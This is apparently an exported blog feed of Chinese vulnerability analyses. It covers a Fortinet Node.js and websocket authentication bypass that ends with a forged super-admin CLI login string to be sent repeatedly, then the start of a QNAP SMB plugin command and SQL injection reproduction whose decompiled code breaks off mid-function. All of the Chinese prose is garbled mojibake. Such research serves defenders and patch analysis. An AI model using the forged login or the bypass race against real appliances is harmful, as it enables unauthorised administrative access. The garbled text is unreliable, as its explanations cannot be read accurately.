<div class="code-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> args = <span class="title class_">Array</span>.<span class="title function_">from</span>(<span class="variable language_">arguments</span>),</span><br><span class="line">        segments = args.<span class="title function_">filter</span>(<span class="function"><span class="params">param</span> =&gt;</span> <span class="title function_">typeof</span>(param) === <span class="string">&#x27;string&#x27;</span>),</span><br><span class="line">        options = args.<span class="title function_">find</span>(<span class="function"><span class="params">param</span> =&gt;</span> <span class="title function_">typeof</span>(param) === <span class="string">&#x27;object&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> uri = segments.<span class="title function_">join</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> defaultHeaders = &#123;</span><br><span class="line">        <span class="string">&#x27;user-agent&#x27;</span>: <span class="variable constant_">SYMBOLS</span>.<span class="property">NODE_USER_AGENT</span>,</span><br><span class="line">        <span class="string">&#x27;accept-encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">_options</span> = <span class="title class_">Object</span>.<span class="title function_">assign</span>(&#123;&#125;, options);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">_options</span>.<span class="property">headers</span> = <span class="title class_">Object</span>.<span class="title function_">assign</span>(defaultHeaders, options &amp;&amp; options.<span class="property">headers</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// apiURL will be the base URL to resolve against if the uri is not absolute.</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">_url</span> = <span class="keyword">new</span> <span class="title function_">URL</span>(uri, apiURL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ApiFetch çš„æ„é€ å‡½æ•°ä¸­ï¼Œä¼šå°† authParams è®¾ç½®ä¸º args æ•°ç»„ï¼ŒåŒæ—¶ä¼šæŠŠ User-Agent è®¾ç½®ä¸º Node.jsï¼Œè¿™æ—¶ï¼Œå‘å¾€åç«¯çš„é‰´æƒè¯·æ±‚æ»¡è¶³è¿™æ ·å‡ ä¸ªæ¡ä»¶ï¼š</p>
<ol>
<li>ç”±äºè¯·æ±‚æ˜¯ä» Node.js è½¬å‘åˆ° httpsd ä¸­çš„ï¼Œä¸” Forwarded æœªè¢«ä¿®æ”¹ï¼Œå› æ­¤æº IP åœ°å€ä¸º 127.0.0.1</li>
<li>User-Agnet è¢«è®¾ç½®ä¸º Node.js å­—ç¬¦ä¸²</li>
</ol>
<p>ä¹Ÿå°±æ˜¯è¯´è¿™ç§æƒ…å†µåˆšå¥½æ»¡è¶³ API èº«ä»½éªŒè¯å‡½æ•° <code>api_access_check_for_trusted_access</code> çš„æ¡ä»¶ï¼Œå°±å¯ä»¥é€šè¿‡èº«ä»½éªŒè¯ã€‚</p>
<h1 id="Websocket-é‰´æƒç»•è¿‡"><a href="#Websocket-é‰´æƒç»•è¿‡" class="headerlink" title="Websocket é‰´æƒç»•è¿‡"></a>Websocket é‰´æƒç»•è¿‡</h1><p>é€šè¿‡äº† Node.js èº«ä»½éªŒè¯åï¼Œjs ä¸­ä¼šæ„é€  CliConnection å¯¹è±¡å¼€å§‹è¿æ¥åç«¯ CLI æœåŠ¡ã€‚</p>
<div class="code-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">constructor</span>(<span class="params">ws, request, options, groupContext</span>) &#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">NOTE:</span> x-auth-admin-vdoms could be empty, if admin is &quot;global&quot; admin</span></span><br><span class="line">    <span class="keyword">const</span> args = [</span><br><span class="line">        <span class="string">`&quot;<span class="subst">$&#123;request.headers[<span class="string">&#x27;x-auth-login-name&#x27;</span>]&#125;</span>&quot;`</span>,</span><br><span class="line">        <span class="string">`&quot;<span class="subst">$&#123;request.headers[<span class="string">&#x27;x-auth-admin-name&#x27;</span>]&#125;</span>&quot;`</span>,</span><br><span class="line">        <span class="string">`&quot;<span class="subst">$&#123;request.headers[<span class="string">&#x27;x-auth-vdom&#x27;</span>]&#125;</span>&quot;`</span>,</span><br><span class="line">        <span class="string">`&quot;<span class="subst">$&#123;request.headers[<span class="string">&#x27;x-auth-profile&#x27;</span>]&#125;</span>&quot;`</span>,</span><br><span class="line">        <span class="string">`&quot;<span class="subst">$&#123;request.headers[<span class="string">&#x27;x-auth-admin-vdoms&#x27;</span>]&#125;</span>&quot;`</span>,</span><br><span class="line">        <span class="string">`&quot;<span class="subst">$&#123;request.headers[<span class="string">&#x27;x-auth-sso&#x27;</span>] || SYMBOLS.SSO_LOGIN_TYPE_NONE_STR&#125;</span>&quot;`</span>,</span><br><span class="line">        request.<span class="property">headers</span>[<span class="string">&#x27;x-forwarded-client&#x27;</span>],</span><br><span class="line">        request.<span class="property">headers</span>[<span class="string">&#x27;x-forwarded-local&#x27;</span>]</span><br><span class="line">    ];</span><br><span class="line">    <span class="keyword">const</span> csfAuth = request.<span class="property">headers</span>[<span class="string">&#x27;x-auth-csf&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">ws</span> = ws;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">options</span> = options;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">groupContext</span> = groupContext;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">logInfo</span>(<span class="string">&#x27;CLI websocket initialized.&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> cli = <span class="variable language_">this</span>.<span class="property">cli</span> = <span class="title function_">connect</span>(&#123;</span><br><span class="line">        <span class="attr">port</span>: <span class="number">8023</span>, <span class="attr">host</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="attr">localAddress</span>: <span class="string">&#x27;127.0.0.2&#x27;</span></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">logInfo</span>(<span class="string">&#x27;CLI connection established.&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// please allow some debug/error messages around greetings</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">expectedGreetings</span> = <span class="regexp">/Connected\./</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">loginContext</span> = args.<span class="title function_">join</span>(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">logInfo</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.loginContext&#125;</span>\n`</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Extra args to authenticate CSF admin</span></span><br><span class="line">    <span class="keyword">if</span> (csfAuth) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">loginContext</span> += <span class="string">` <span class="subst">$&#123;CSF_PROF_PATH&#125;</span>/<span class="subst">$&#123;csfAuth&#125;</span>`</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_csfAuth</span> = csfAuth;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ws.<span class="title function_">on</span>(<span class="string">&#x27;message&#x27;</span>, <span class="function"><span class="params">msg</span> =&gt;</span> cli.<span class="title function_">write</span>(msg));</span><br><span class="line">    cli.<span class="title function_">setNoDelay</span>().<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function"><span class="params">data</span> =&gt;</span> <span class="variable language_">this</span>.<span class="title function_">processData</span>(data));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> wsClosed = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">let</span> cliDestroyed = <span class="literal">false</span>;</span><br><span class="line">    ws.<span class="title function_">on</span>(<span class="string">&#x27;close&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!wsClosed) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">logInfo</span>(<span class="string">&#x27;Websocket closed.&#x27;</span>);</span><br><span class="line">            wsClosed = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!cliDestroyed) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">logInfo</span>(<span class="string">&#x27;Destroying CLI connection.&#x27;</span>);</span><br><span class="line">            cli.<span class="title function_">destroy</span>();</span><br><span class="line">            cliDestroyed = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    cli.<span class="title function_">on</span>(<span class="string">&#x27;close&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!wsClosed) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">logInfo</span>(<span class="string">&#x27;Connection terminated by CLI.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        ws.<span class="title function_">close</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Cleanup</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">_csfAuth</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">logInfo</span>(<span class="string">&#x27;Removing CSF CLI authentication file.&#x27;</span>);</span><br><span class="line">            <span class="keyword">const</span> filePath = <span class="string">`<span class="subst">$&#123;CSF_PROF_PATH&#125;</span>/<span class="subst">$&#123;<span class="variable language_">this</span>._csfAuth&#125;</span>`</span>;</span><br><span class="line"></span><br><span class="line">            fs.<span class="title function_">unlink</span>(filePath, <span class="function">() =&gt;</span> &#123;&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å‡½æ•°é¦–å…ˆä¼šå‘æœ€ç»ˆå‘å¾€åç«¯çš„è¯·æ±‚ä¸­æ·»åŠ ä¸€äº›å‚æ•°ï¼Œè¿™äº›å‚æ•°çš„å–å€¼æ¥è‡ªäºå½“å‰ session å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯ <code>WebAuth.getValidatedSession</code> å‡½æ•°çš„è¿”å›å€¼ã€‚</p>
<p>å½“åˆ©ç”¨ Node.js èº«ä»½éªŒè¯ç»•è¿‡æ¥åˆ°æ­¤å¤„æ—¶ï¼Œç”±äºç»•è¿‡çš„æ˜¯ API é‰´æƒï¼Œå› æ­¤å½“å‰ç”¨æˆ·è§’è‰²åº”è¯¥æ˜¯ <code>Local_Process_Access</code>ï¼Œè®¾ç½®å¥½ä¸€ç³»åˆ—å‚æ•°åï¼Œä¼šé€šè¿‡ socket è¿æ¥åˆ° 127.0.0.1:8023ï¼Œä¹Ÿå°±æ˜¯ CLI æœåŠ¡çš„ç«¯å£ï¼Œæ¥ç€é€šè¿‡ <code>ws.on</code> ç»‘å®šäº† message äº‹ä»¶ï¼Œå½“ websocket æ¥æ”¶åˆ°å®¢æˆ·ç«¯çš„æ•°æ®æ—¶ï¼Œå°±ä¼šç«‹åˆ»å‘é€ç»™ CLI æœåŠ¡ã€‚</p>
<p>éšååˆç»‘å®šäº† CLI çš„ socket äº‹ä»¶ï¼Œå½“ CLI ç¨‹åºå‘é€è¿‡æ¥æ•°æ®æ—¶ï¼Œä¼šè§¦å‘ processData å‡½æ•°</p>
<div class="code-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">processData</span>(<span class="params">buf</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> cli = <span class="variable language_">this</span>.<span class="property">cli</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> opt, i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i + <span class="number">2</span> &lt; buf.<span class="property">length</span> &amp;&amp; buf[i] === <span class="variable constant_">CMD</span>.<span class="property">IAC</span>;) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> cmd = buf[i + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="variable constant_">CMD</span>.<span class="property">WILL</span>:</span><br><span class="line">                opt = buf[i + <span class="number">2</span>];</span><br><span class="line">                <span class="title function_">eat</span>(<span class="number">3</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="variable constant_">CMD</span>.<span class="property">DO</span>:</span><br><span class="line">                opt = buf[i + <span class="number">2</span>];</span><br><span class="line">                <span class="keyword">switch</span> (opt) &#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="variable constant_">OPT</span>.<span class="property">NAWS</span>:</span><br><span class="line">                        <span class="variable language_">this</span>.<span class="title function_">telnetCommand</span>(<span class="variable constant_">CMD</span>.<span class="property">WILL</span>, <span class="variable constant_">OPT</span>.<span class="property">NAWS</span>);</span><br><span class="line">                        <span class="variable language_">this</span>.<span class="title function_">resizeCLI</span>(<span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">cols</span>, <span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">rows</span>);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="attr">default</span>:</span><br><span class="line">                        <span class="variable language_">this</span>.<span class="title function_">telnetCommand</span>(<span class="variable constant_">CMD</span>.<span class="property">WONT</span>, opt);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="title function_">eat</span>(<span class="number">3</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="variable constant_">CMD</span>.<span class="property">DONT</span>:</span><br><span class="line">                opt = buf[i + <span class="number">2</span>];</span><br><span class="line">                <span class="title function_">eat</span>(<span class="number">3</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="attr">default</span>:</span><br><span class="line">                <span class="variable language_">this</span>.<span class="title function_">logError</span>(<span class="string">&#x27;Unknown opcode %d&#x27;</span>, buf[i + <span class="number">1</span>]);</span><br><span class="line">                <span class="title function_">eat</span>(<span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> data = buf.<span class="title function_">slice</span>(i);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (data) &#123;</span><br><span class="line">        <span class="keyword">const</span> ws = <span class="variable language_">this</span>.<span class="property">ws</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">expectedGreetings</span>) &#123;</span><br><span class="line">            <span class="comment">// hold login until server greeting</span></span><br><span class="line">            <span class="keyword">if</span> (data.<span class="title function_">toString</span>().<span class="title function_">match</span>(<span class="variable language_">this</span>.<span class="property">expectedGreetings</span>)) &#123;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="title function_">logInfo</span>(<span class="string">&#x27;Parsed expected greeting&#x27;</span>);</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">expectedGreetings</span> = <span class="literal">null</span>;</span><br><span class="line">                <span class="comment">// don&#x27;t echo login context</span></span><br><span class="line">                <span class="variable language_">this</span>.<span class="title function_">telnetCommand</span>(<span class="variable constant_">CMD</span>.<span class="property">DONT</span>, <span class="variable constant_">OPT</span>.<span class="property">ECHO</span>);</span><br><span class="line">                <span class="variable language_">this</span>.<span class="title function_">logInfo</span>(<span class="string">&#x27;Sending login context&#x27;</span>);</span><br><span class="line">                <span class="comment">// send login context</span></span><br><span class="line">                cli.<span class="title function_">write</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.loginContext&#125;</span>\n`</span>);</span><br><span class="line">                <span class="variable language_">this</span>.<span class="title function_">setup</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ws.<span class="title function_">send</span>(data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">eat</span>(<span class="params">n</span>) &#123;</span><br><span class="line">        i += n;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¿™ä¸ªå‡½æ•°å…³é”®åœ¨äºï¼Œå®ƒä¼šä½¿ç”¨ cli.write å°†ä¹‹å‰è®¾ç½®çš„ç™»å½•ä¿¡æ¯å‘é€ç»™ CLI ç¨‹åºè¿›è¡Œç™»å½•æ“ä½œã€‚ç»•è¿‡ API é‰´æƒç”Ÿæˆçš„ç™»å½•ä¿¡æ¯å¦‚ä¸‹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;Local_Process_Access&quot; &quot;Local_Process_Access&quot; &quot;root&quot; &quot;&quot; &quot;&quot; &quot;none&quot; [192.168.66.1]:50296 [192.168.66.161]:80\n</span><br></pre></td></tr></table></figure></div>

<p><code>Local_Process_Access</code> è§’è‰²å¹¶ä¸èƒ½é€šè¿‡ CLI ç¨‹åºçš„é‰´æƒï¼Œå› ä¸ºè¯¥ç”¨æˆ·ä¸å…·æœ‰ CLI æ‰§è¡Œæƒé™ã€‚</p>
<p>è€ƒè™‘ Node.js ä¸­çš„äº‹ä»¶ç»‘å®šé€»è¾‘å…³ç³»ï¼Œä»£ç å…ˆç»‘å®šäº† websocket çš„ message äº‹ä»¶ï¼Œåç»‘å®š CLI socket æ•°æ®äº‹ä»¶ã€‚æˆ‘ä»¬çŸ¥é“é€šè¿‡ Socket è¿æ¥åˆ° CLI æœåŠ¡ä¹‹åï¼ŒCLI æœåŠ¡è‚¯å®šä¼šå…ˆè¿”å›ä¸€äº›æ•°æ®ï¼Œè¦æ±‚è¿›è¡Œèº«ä»½éªŒè¯ï¼Œæ­¤æ—¶ä¼šå…ˆè§¦å‘ Node.js ä¸­çš„ CLI socket äº‹ä»¶ï¼Œä»¤ Node.js å‘é€ä¸å¯æ§çš„ç™»å½•ä¿¡æ¯ï¼Œè¿™ç§æƒ…å†µä¸‹æ— æ³•ç»•è¿‡ CLI é‰´æƒã€‚</p>
<p>ä½†å½“ Websocket è¿æ¥æˆåŠŸå»ºç«‹ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•ç«‹åˆ»å‘ Websocket å‘é€ä¸€ä»½ä¼ªé€ çš„ç™»å½•ä¿¡æ¯ï¼Œåœ¨ç†æƒ³æƒ…å†µä¸‹ï¼Œè¿™ä¸ªä¼ªé€ çš„ä¿¡æ¯ä¼šä¼˜å…ˆäº processData ä¸­åˆæ³•ä¿¡æ¯åˆ°è¾¾ CLI ç¨‹åºï¼Œè¿™æ ·å°±å¯ä»¥ç»•è¿‡ CLI èº«ä»½éªŒè¯ã€‚</p>
<p>ä¾‹å¦‚ä¸€ä¸ªä¼ªé€ çš„ç™»å½•ä¿¡æ¯å¯ä»¥æ˜¯ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;admin&quot; &quot;admin&quot; &quot;root&quot; &quot;super_admin&quot; &quot;root&quot; &quot;none&quot; [127.0.0.1]:12345 [127.0.0.1]:12346\n</span><br></pre></td></tr></table></figure></div>

<p>é€šè¿‡ä¸æ–­è¿æ¥ Websocket å¹¶å‘é€ç™»å½•æ•°æ®ï¼Œæœ€ç»ˆå°±å¯ä»¥å®ç° CLI ç™»å½•ç»•è¿‡ï¼Œå¹¶ä»¥ç®¡ç†å‘˜èº«ä»½è®¿é—® CLI æœåŠ¡ã€‚è¿™ä¹Ÿç¬¦åˆå…¬å‘Šä¸­ IOC æƒ…æŠ¥ï¼šæ”»å‡»è€…å¯ä»¥æ§åˆ¶æœ€ç»ˆçš„æºå’Œç›®çš„ IP åœ°å€ã€‚</p>
<h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><p><a class="link"   href="https://fortiguard.fortinet.com/psirt/FG-IR-24-535" >https://fortiguard.fortinet.com/psirt/FG-IR-24-535<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://www.fortiguard.com/psirt/FG-IR-22-377" >https://www.fortiguard.com/psirt/FG-IR-22-377<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2024-50387 &amp; CVE-2024-50388</title>
    <url>/2024/11/21/QNAP_PWN2OWN_2024/</url>
    <content><![CDATA[<p>æœ¬æ–‡å¤ç° PWN2OWN 2024 æ¯”èµ›ä¸­æ¶‰åŠ QNAP NAS çš„ä¸¤ä¸ªæ¼æ´ CVE-2024-50387 &amp; CVE-2024-50388</p>
<span id="more"></span>

<p><em>ARM64 æ¶æ„ï¼Œå­˜åœ¨æ¼æ´çš„ç¨‹åºå¯ä»¥<a class="link"   href="https://pan.baidu.com/s/1KHkgIYFuyV9MKHsjoXTRLw?pwd=5cf1" >ç‚¹å‡»è¿™é‡Œ<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>ä¸‹è½½ã€‚</em></p>
<h1 id="CVE-2024-50387"><a href="#CVE-2024-50387" class="headerlink" title="CVE-2024-50387"></a>CVE-2024-50387</h1><p>æ ¹æ®<a class="link"   href="https://www.qnap.com.cn/zh-cn/security-advisory/qsa-24-42" >å®˜æ–¹å…¬å‘Š<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>ï¼Œè¯¥æ¼æ´å½±å“ QNAP NAS ä¸­çš„ SMB Service æ’ä»¶ï¼Œä» 2024 å¹´å¼€å§‹ï¼ŒQNAP å°†åŸæœ¬å†…å»ºåœ¨ç³»ç»Ÿä¸­çš„ SMB æœåŠ¡å‰¥ç¦»å‡ºæ¥ï¼Œæˆä¸ºä¸€ä¸ªå•ç‹¬çš„æ’ä»¶ã€‚è¯¥æ¼æ´å½±å“æ’ä»¶ 4.15.x ç‰ˆæœ¬ï¼Œä»<a class="link"   href="https://www.qnap.com/zh-tw/app_releasenotes/list.php?app_choose=Samba" >å†å²æ›´æ–°<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>æ¥çœ‹ï¼Œä»…å½±å“  4.15.001 å’Œ h4.15.001 ä¸¤ä¸ªç‰ˆæœ¬ã€‚</p>
<p>æ ¹æ® ZDI åœ¨æ¯”èµ›ä¸­å‘å¸ƒçš„<a class="link"   href="https://securityonline.info/cve-2024-50387-critical-qnap-flaw-exploited-in-hacking-contest-patch-now/" >ä¿¡æ¯<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>ï¼Œå¯ä»¥çŸ¥é“è¯¥æ¼æ´æ˜¯å‚æ•°æ³¨å…¥ + SQL æ³¨å…¥ã€‚è€ƒè™‘æ’ä»¶æœ¬èº«çš„åŠŸèƒ½ï¼Œå®ƒä¸»è¦å¯¹å¤–æä¾› Web ç®¡ç†æ¥å£ä»¥åŠ SMB æœåŠ¡ï¼Œè€Œ Web ç®¡ç†æ¥å£æ˜¯éœ€è¦æƒé™éªŒè¯çš„ï¼Œå› æ­¤çŒœæµ‹æ¼æ´å­˜åœ¨äº SMB æœåŠ¡ä¸­ã€‚è€Œ Samba æ˜¯ä½¿ç”¨éå¸¸å¹¿æ³›çš„å¼€æºè½¯ä»¶ï¼ŒåŸç‰ˆç¨‹åºä¸å¤ªå¯èƒ½å‡ºç°æ­¤ç±»é—®é¢˜ï¼ŒQNAP å¯èƒ½å¯¹å…¶è¿›è¡Œäº†æŸäº›ä¿®æ”¹ï¼Œ ä»è€Œå¼•å…¥äº†è¿™ä¸€ä¸ªæ¼æ´ã€‚</p>
<p>ä¸‹è½½æœ€æ–°ç‰ˆçš„ SMB æ’ä»¶ï¼Œå’Œæ—§ç‰ˆè¿›è¡Œè¡¥ä¸å¯¹æ¯”ï¼Œå‘ç°ä¸»è¦æ˜¯ä¸€äº› lib åº“å‘ç”Ÿäº†å˜åŒ–ï¼Œé€ä¸ªåˆ†æå¾ˆå¿«å°±èƒ½æ‰¾åˆ°ç–‘ä¼¼æ¼æ´ç‚¹ä½ç½®ï¼Œä½äº <code>libauth-samba4.so</code> ä¸­ã€‚</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Old</span></span><br><span class="line">__int64 __fastcall <span class="title function_">sub_A880</span><span class="params">(</span></span><br><span class="line"><span class="params">        <span class="type">int</span> log_type,</span></span><br><span class="line"><span class="params">        <span class="type">const</span> <span class="type">char</span> *a2,</span></span><br><span class="line"><span class="params">        <span class="type">const</span> <span class="type">char</span> *a3,</span></span><br><span class="line"><span class="params">        <span class="type">const</span> <span class="type">char</span> *remote_machine_name,</span></span><br><span class="line"><span class="params">        <span class="type">int</span> action_type,</span></span><br><span class="line"><span class="params">        <span class="type">const</span> <span class="type">char</span> *append)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *log_bin; <span class="comment">// x3</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *user; <span class="comment">// x5</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *IP; <span class="comment">// x6</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *computer_name; <span class="comment">// x7</span></span><br><span class="line">  <span class="type">char</span> v17[<span class="number">2048</span>]; <span class="comment">// [xsp+78h] [xbp+58h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v17, <span class="number">0</span>, <span class="keyword">sizeof</span>(v17));</span><br><span class="line">  <span class="keyword">if</span> ( action_type != <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    log_bin = <span class="string">&quot;/sbin/conn_log_tool&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> ( a2 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">LABEL_11:</span><br><span class="line">    user = <span class="string">&quot;Unknown&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> ( a3 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">LABEL_12:</span><br><span class="line">    IP = <span class="string">&quot;0.0.0.0&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> ( remote_machine_name )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">LABEL_13:</span><br><span class="line">    computer_name = <span class="string">&quot;Unknown&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">  &#125;</span><br><span class="line">  log_bin = <span class="string">&quot;/usr/local/samba/sbin/log_ratelimit.sh&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !a2 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">LABEL_3:</span><br><span class="line">  <span class="keyword">if</span> ( *a2 == <span class="string">&#x27;\\&#x27;</span> )</span><br><span class="line">    user = a2 + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    user = a2;</span><br><span class="line">  <span class="keyword">if</span> ( !a3 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">LABEL_7:</span><br><span class="line">  IP = a3;</span><br><span class="line">  <span class="keyword">if</span> ( !remote_machine_name )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">LABEL_8:</span><br><span class="line">  computer_name = remote_machine_name;</span><br><span class="line">LABEL_9:</span><br><span class="line">  <span class="built_in">snprintf</span>(</span><br><span class="line">    v17,</span><br><span class="line">    <span class="number">0x800</span>uLL,</span><br><span class="line">    <span class="string">&quot;%s -t %d -u &#x27;%s&#x27; -p &#x27;%s&#x27; -m &#x27;%s&#x27; -i %d -n %d -a &#x27;%s&#x27; -S&quot;</span>,</span><br><span class="line">    log_bin,</span><br><span class="line">    log_type,</span><br><span class="line">    user,</span><br><span class="line">    IP,</span><br><span class="line">    computer_name,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    action_type,</span><br><span class="line">    append);</span><br><span class="line">  smbrun(v17, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// New</span></span><br><span class="line"><span class="type">size_t</span> __fastcall <span class="title function_">cmd_filter</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> result; <span class="comment">// x0</span></span><br><span class="line">  __int64 v3; <span class="comment">// x2</span></span><br><span class="line">  <span class="type">bool</span> v4; <span class="comment">// zf</span></span><br><span class="line">  <span class="type">bool</span> v5; <span class="comment">// cc</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// w1</span></span><br><span class="line"></span><br><span class="line">  result = <span class="built_in">strlen</span>(data);</span><br><span class="line">  <span class="keyword">if</span> ( result &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span 